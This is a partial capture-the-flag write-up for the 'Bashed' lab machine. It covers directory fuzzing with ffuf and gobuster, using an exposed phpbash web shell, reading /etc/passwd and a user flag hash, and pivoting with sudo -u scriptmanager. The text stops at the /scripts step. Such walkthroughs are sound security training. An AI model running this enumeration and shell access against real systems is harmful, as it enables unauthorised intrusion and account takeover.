# Fuzzing The Bashed Machine

Fuzz using `ffuf` and storing the output in an HTML file
```bash
ffuf -u http://10.129.117.219/FUZZ -w /home/drew/tools/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -of html -o ffuf_scan.html -fc 404
```

Directory brute forcing with `gobuster`
```bashed
gobuster dir -u http://10.129.117.219 -w /home/drew/tools/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt --no-error -o gobuster.html
```

# Fuzz Findings

We can explore the sites directory, many folders such as `php`, `dev` and `js`
Whats interesting to me is the `js` folder and the `main.js` inside it
Viewing the source code we can find weak points to exploit 
In the `dev` folder we find lots of interesting points

```perl
http://10.129.117.219/dev/phpbash.php
```

`phpbash` servers as an in browser terminal you can access 

```php
www-data@bashed:/var/www/html/dev# whoami
www-data
```

The current users is logged in with `www-data` privileges 

```php
www-data@bashed:/var/www/html/dev# pwd
/var/www/html/dev

www-data@basheh:/var/www/html/dev# cd /home

www-data@bashed:/home# cd arrexel
```

We find a file called `arrexel`

```php
cat user.txt
ebbd7cfc6883f54ce132ce48d7377647
```

The user we want to pay attention to is `scriptmanager`

```bash
cat /etc/passwd
```

This is how I checked out users, one's who could execute commands without sudo

the account `www-data` can run any command as a user without the need of a password to authenticate

```bash
sudo -u scriptmanager whoami
```

What folder can the system root can `scriptmanager` access that `www-data` could not? 

```
/scripts
```

Using `ls -l `we can see file access privileges 

